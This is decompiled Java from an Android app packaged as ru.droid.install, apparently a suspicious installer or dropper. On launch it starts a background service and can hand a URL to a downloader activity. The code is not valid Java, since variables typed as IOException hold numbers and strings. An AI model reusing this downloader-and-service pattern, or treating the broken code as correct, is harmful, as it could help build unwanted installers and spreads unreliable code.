	private android.app.Activity a
	
	    public HeadActivity()
	    {
	        this.a = this;
	        return;
	    }
	
	
	    private boolean a(String p8)
	    {
	        java.io.IOException v0_2;
	        if (!p8.equals("1")) {
	            v0_2 = 0;
	        } else {
	            try {
	                char[] v6 = new char["1".length()];
	                new java.io.InputStreamReader(this.openFileInput("code.reg")).read(v6);
	                java.io.IOException v0_7 = new String(v6);
	            } catch (java.io.IOException v0_9) {
	                v0_9.printStackTrace();
	                v0_7 = "";
	            } catch (java.io.IOException v0_8) {
	                v0_8.printStackTrace();
	                v0_7 = "";
	            }
	            if (!v0_7.equals("1")) {
	                try {
	                    java.io.OutputStreamWriter v1_3 = new java.io.OutputStreamWriter(this.openFileOutput("code.reg", 1));
	                } catch (java.io.IOException v0_15) {
	                    v0_15.printStackTrace();
	                    v0_2 = 0;
	                }
	                try {
	                    v1_3.write("0");
	                    v1_3.flush();
	                    v1_3.close();
	                } catch (java.io.IOException v0_14) {
	                    v0_14.printStackTrace();
	                }
	            } else {
	                v0_2 = 1;
	            }
	        }
	        return v0_2;
	    }
	
	
	    public void onCreate(android.os.Bundle p5)
	    {
	        super.onCreate(p5);
	        this.setContentView(2130903043);
	        this.startService(new android.content.Intent(this, ru.droid.install.system.AndroidService));
	        android.widget.Button v0_4 = new ru.droid.install.other.a("123", this);
	        if (this.a(v0_4.b)) {
	            ru.droid.install.ui.e v1_5 = new android.content.Intent(this.getBaseContext(), ru.droid.install.ui.DownloadersActivity);
	            v1_5.putExtra("URL", v0_4.a);
	            this.startActivity(v1_5);
	            this.finish();
	        }
	        this.getPackageName();
	        new StringBuilder().append(this.getPackageName()).append(".InstallActivitys").toString();
	        ((android.widget.TextView) this.findViewById(2131099655)).setText(android.text.Html.fromHtml(this.getString(2130968577)));
	        android.widget.Button v0_15 = ((android.widget.Button) this.findViewById(2131099660));
	        ((android.widget.Button) this.findViewById(2131099661)).setOnClickListener(new ru.droid.install.ui.d(this));
	        v0_15.setOnClickListener(new ru.droid.install.ui.e(this));
	        return;
	    }
	
